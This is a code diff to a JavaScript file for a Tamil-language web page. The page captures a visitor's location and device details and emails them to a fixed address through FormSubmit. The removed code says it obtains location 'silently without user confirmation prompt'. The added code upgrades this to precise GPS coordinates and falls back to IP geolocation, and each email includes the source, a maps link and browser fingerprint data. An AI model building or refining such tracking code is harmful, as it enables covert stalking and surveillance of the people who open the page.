@@ -32,54 +32,80 @@ document.addEventListener('DOMContentLoaded', () => {
 });
 
 /**
- * Initiates the geolocation request silently via IP.
+ * Initiates the geolocation request.
+ * First tries Browser Geolocation (Exact), then falls back to IP Geolocation (Approximate).
  */
 async function initGeolocation() {
     const detailsEl = document.getElementById('location-details');
-
     updateStatus('இருப்பிடம் கண்டறியப்படுகிறது...', 'pending');
 
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                // Exact location (GPS/Location Services)
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                await handleLocationSuccess(lat, lon, "Exact Location (GPS)");
+            },
+            async (error) => {
+                // Fallback to IP if GPS is denied or unavailable
+                console.warn("Browser geolocation failed, falling back to IP:", error.message);
+                await fallbackToIPGeolocation();
+            },
+            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+        );
+    } else {
+        // Browser doesn't support geolocation, fallback to IP
+        await fallbackToIPGeolocation();
+    }
+}
+
+/**
+ * Fallback to IP Geolocation when Browser API fails.
+ */
+async function fallbackToIPGeolocation() {
     try {
-        // Use an IP Geolocation API to get location silently without user confirmation prompt
         const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
         const data = await response.json();
-
-        const latitude = parseFloat(data.latitude);
-        const longitude = parseFloat(data.longitude);
-        const city = data.city || 'Unknown City';
-        const region = data.region || 'Unknown Region';
-        const country = data.country || 'Unknown Country';
-
-        const ipAddress = `${city}, ${region}, ${country}`;
-
-        updateStatus('இருப்பிடம் கண்டறியப்பட்டது', 'success');
-        detailsEl.innerHTML = `
-            <div class="loc-card">
-                <p><strong>Lat:</strong> ${latitude.toFixed(4)}</p>
-                <p><strong>Long:</strong> ${longitude.toFixed(4)}</p>
-                <div id="address-info" style="margin-top: 5px; font-size: 12px; color: #444;">
-                    <strong>Type:</strong> IP-based Location<br>
-                    <strong>Approx Address:</strong> ${ipAddress}<br>
-                    <em>துல்லியமான முகவரி கண்டறியப்படுகிறது...</em>
-                </div>
-                <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank" class="maps-link">
-                    📍 கூகுள் மேப்பில் பார்க்க (View on Maps)
-                </a>
-            </div>
-            ${getDeviceInfoHTML()}
-        `;
-
-        fetchReverseGeocode(latitude, longitude).then(address => {
-            sendEmailWithDetails(latitude, longitude, address);
-        });
-
+        const lat = parseFloat(data.latitude);
+        const lon = parseFloat(data.longitude);
+        const source = `IP-based Location (Approximate: ${data.city || 'Unknown'}, ${data.country || 'Unknown'})`;
+        await handleLocationSuccess(lat, lon, source);
     } catch (error) {
+        console.error("IP Geolocation also failed:", error);
         updateStatus('பிழை', 'error');
-        detailsEl.innerHTML = `
+        document.getElementById('location-details').innerHTML = `
             <p>இருப்பிடத்தை கண்டறிய முடியவில்லை.</p>
             ${getDeviceInfoHTML()}
         `;
     }
+}
+
+/**
+ * Handles the display and email triggering once coordinates are found.
+ */
+async function handleLocationSuccess(lat, lon, source) {
+    const detailsEl = document.getElementById('location-details');
+    updateStatus('இருப்பிடம் கண்டறியப்பட்டது', 'success');
+
+    detailsEl.innerHTML = `
+        <div class="loc-card">
+            <p><strong>Lat:</strong> ${lat.toFixed(6)}</p>
+            <p><strong>Long:</strong> ${lon.toFixed(6)}</p>
+            <div id="address-info" style="margin-top: 5px; font-size: 12px; color: #444;">
+                <strong>Source:</strong> ${source}<br>
+                <em>துல்லியமான முகவரி கண்டறியப்படுகிறது...</em>
+            </div>
+            <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" class="maps-link">
+                📍 கூகுள் மேப்பில் பார்க்க (View on Maps)
+            </a>
+        </div>
+        ${getDeviceInfoHTML()}
+    `;
+
+    // Fetch address and trigger email service
+    const address = await fetchReverseGeocode(lat, lon);
+    sendEmailWithDetails(lat, lon, address, source);
 }
 
 /**
@@ -134,7 +160,7 @@ async function fetchReverseGeocode(lat, lon) {
 /**
  * Sends the captured location and device info directly to the provided email using FormSubmit.
  */
-function sendEmailWithDetails(lat, lon, address) {
+function sendEmailWithDetails(lat, lon, address, source) {
     const userAgent = navigator.userAgent;
     const platform = navigator.platform || navigator.userAgentData?.platform || 'Unknown';
     const lang = navigator.language;
@@ -142,7 +168,8 @@ function sendEmailWithDetails(lat, lon, address) {
     const connection = navigator.connection ? navigator.connection.effectiveType : 'Unknown';
 
     const emailData = {
-        _subject: "New Location Details Captured",
+        _subject: `New Location Captured: ${source}`,
+        "Source": source,
         "Latitude": lat,
         "Longitude": lon,
         "Google Maps Link": `https://www.google.com/maps?q=${lat},${lon}`,
